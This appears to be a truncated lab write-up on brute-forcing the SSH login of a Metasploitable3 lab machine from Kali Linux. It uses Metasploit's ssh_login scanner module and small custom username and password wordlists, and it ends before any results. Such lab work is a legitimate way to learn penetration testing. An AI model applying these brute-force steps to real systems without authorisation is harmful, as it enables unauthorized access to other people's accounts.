
#  Task 1.1 – Use Kali Linux tool Metasploit to compromise the service.

## 🎯 Objective
Compromise the SSH service of Metasploitable3 from Kali Linux using Metasploit and gain unauthorized access.

---

## 🖥️ Environment Setup

| Machine            | IP Address      | Role         |
|--------------------|------------------|--------------|
| Kali Linux         | 192.168.64.2       | Attacker     |
| Metasploitable3    | 192.168.64.3       | Victim       |

---

## 🛠 Tools Used

- **Kali Linux** – Attack platform
- **Metasploit Framework** – Exploitation tool
- **Metasploitable3** – Vulnerable target machine

---

## 🔍 Steps Performed

### ✅ Step 1: Start Metasploit
Open a terminal in Kali Linux and type:

```bash
msfconsole
```
### ✅ Step 2: Select the SSH Login Scanner Module

Open Metasploit and type the following to use the SSH login scanner:

```bash
use auxiliary/scanner/ssh/ssh_login
```

### ✅ Step 3: Create Custom Wordlists
``` bash
echo -e "root\nmsfadmin\nuser\nadmin" > /home/kali/ssh-brute/users.txt
echo -e "root\nmsfadmin\ntoor\n123456" > /home/kali/ssh-brute/pass.txt

